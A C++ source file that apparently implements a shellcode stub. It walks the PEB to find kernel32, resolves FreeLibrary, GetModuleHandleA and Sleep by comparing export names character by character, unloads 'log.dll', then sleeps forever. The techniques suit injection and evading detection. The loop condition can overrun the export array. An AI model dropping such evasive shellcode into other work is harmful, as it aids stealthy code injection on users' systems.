#include <windows.h>
#include <winternl.h>

struct FunctionTable
{
	BOOL(WINAPI* freeLibrary)(HMODULE);
	HMODULE(WINAPI* getModuleHandle)(PCHAR);
	VOID(WINAPI* getSleep)(DWORD);
};

FARPROC inline getFunction(FunctionTable* ft, HMODULE hModuleBase)
{
	PIMAGE_DOS_HEADER lpDosHeader = (PIMAGE_DOS_HEADER)hModuleBase;
	PIMAGE_NT_HEADERS lpNtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)hModuleBase + lpDosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY lpExports = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)hModuleBase + (ULONG_PTR)lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD lpdwFunName = (PDWORD)((ULONG_PTR)hModuleBase + (ULONG_PTR)lpExports->AddressOfNames);
	PWORD lpword = (PWORD)((ULONG_PTR)hModuleBase + (ULONG_PTR)lpExports->AddressOfNameOrdinals);
	PDWORD  lpdwFunAddr = (PDWORD)((ULONG_PTR)hModuleBase + (ULONG_PTR)lpExports->AddressOfFunctions);

	DWORD dwLoop = 0;
	FARPROC pRet = NULL;
	for (int functionCount = sizeof(FunctionTable) / sizeof(ULONG_PTR);
		dwLoop <= lpExports->NumberOfNames - 1 || functionCount > 0;
		dwLoop++)
	{
		char* pFunName = (char*)(lpdwFunName[dwLoop] + (ULONG_PTR)hModuleBase);

		if (pFunName[0] == 'F' &&
			pFunName[1] == 'r' &&
			pFunName[2] == 'e' &&
			pFunName[3] == 'e' &&
			pFunName[4] == 'L' &&
			pFunName[5] == 'i' &&
			pFunName[6] == 'b' &&
			pFunName[7] == 'r' &&
			pFunName[8] == 'a' &&
			pFunName[9] == 'r' &&
			pFunName[10] == 'y' &&
			pFunName[11] == 0)
		{
			ft->freeLibrary = (BOOL(WINAPI*)(HMODULE))(lpdwFunAddr[lpword[dwLoop]] + (ULONG_PTR)hModuleBase);
			functionCount--;
			continue;
		}
		else if (pFunName[0] == 'G' &&
			pFunName[1] == 'e' &&
			pFunName[2] == 't' &&
			pFunName[3] == 'M' &&
			pFunName[4] == 'o' &&
			pFunName[5] == 'd' &&
			pFunName[6] == 'u' &&
			pFunName[7] == 'l' &&
			pFunName[8] == 'e' &&
			pFunName[9] == 'H' &&
			pFunName[10] == 'a' &&
			pFunName[11] == 'n' &&
			pFunName[12] == 'd' &&
			pFunName[13] == 'l' &&
			pFunName[14] == 'e' &&
			pFunName[15] == 'A' &&
			pFunName[16] == 0)
		{
			ft->getModuleHandle = (HMODULE(WINAPI*)(PCHAR))(lpdwFunAddr[lpword[dwLoop]] + (ULONG_PTR)hModuleBase);
			functionCount--;
			continue;
		}
		else if (pFunName[0] == 'S' &&
			pFunName[1] == 'l' &&
			pFunName[2] == 'e' &&
			pFunName[3] == 'e' &&
			pFunName[4] == 'p' &&
			pFunName[5] == 0)
		{
			ft->getSleep = (VOID(WINAPI*)(DWORD))(lpdwFunAddr[lpword[dwLoop]] + (ULONG_PTR)hModuleBase);
			functionCount--;
			continue;
		}

	}
	return pRet;
}

HMODULE inline GetKernel32()
{
	PPEB peb = nullptr;
#if defined(_WIN64)
	peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#elif defined(_WIN32)
	peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif

	// Traverse the module list in the PEB to find the module by name
	PLIST_ENTRY moduleList = &peb->Ldr->InMemoryOrderModuleList;
	PLIST_ENTRY entry = moduleList->Flink->Flink->Flink;

	return (HMODULE)CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)->DllBase;
}

extern "C" __declspec(dllexport)  void Shellcode()
{
	FunctionTable ft;
	char moduleName[] = { 'l','o','g','.','d','l','l',0 };

	getFunction(&ft, GetKernel32());

	ft.freeLibrary(ft.getModuleHandle(moduleName));

	while (1)
	{
		ft.getSleep(INFINITE);
	};
}